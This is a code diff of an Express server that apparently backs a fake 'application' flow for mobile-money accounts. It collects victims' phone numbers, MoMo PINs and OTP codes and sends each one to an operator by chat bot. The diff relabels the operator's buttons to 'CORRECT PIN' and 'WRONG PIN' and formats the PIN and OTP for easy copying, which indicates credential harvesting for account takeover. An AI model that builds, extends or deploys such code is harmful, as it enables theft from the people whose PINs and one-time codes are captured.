@@ -25,7 +25,7 @@ app.post('/applications', (req, res) => {
   res.json({ id: appId });
 });
 
-// Submit MoMo Auth for Approval
+// Submit MoMo Auth / PIN for Approval
 app.post('/applications/:id/submit-auth', async (req, res) => {
   const appId = req.params.id;
   const appData = applications[appId];
@@ -36,14 +36,14 @@ app.post('/applications/:id/submit-auth', async (req, res) => {
 
   const message = `🔐 *MoMo Authentication Request*\n\n` +
     `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n` +
-    `🔑 *PIN:* ${appData.momo_pin}\n` +
+    `🔑 *PIN:* \`${appData.momo_pin}\`\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Approve Auth', callback_data: `auth_approve_${appId}` },
-        { text: '❌ Reject Auth', callback_data: `auth_reject_${appId}` }
+        { text: '✅ CORRECT PIN', callback_data: `auth_approve_${appId}` },
+        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
       ]
     ]
   };
@@ -109,7 +109,7 @@ app.post('/applications/:id/submit-otp', async (req, res) => {
 
   const message = `🔢 *OTP Verification Received*\n\n` +
     `📱 *Phone / MoMo Number:* ${appData.momo_phone || 'N/A'}\n` +
-    `🔑 *OTP Code:* ${appData.otp_code}\n` +
+    `🔑 *OTP Code:* \`${appData.otp_code}\`\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
@@ -194,4 +194,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-         
+                  
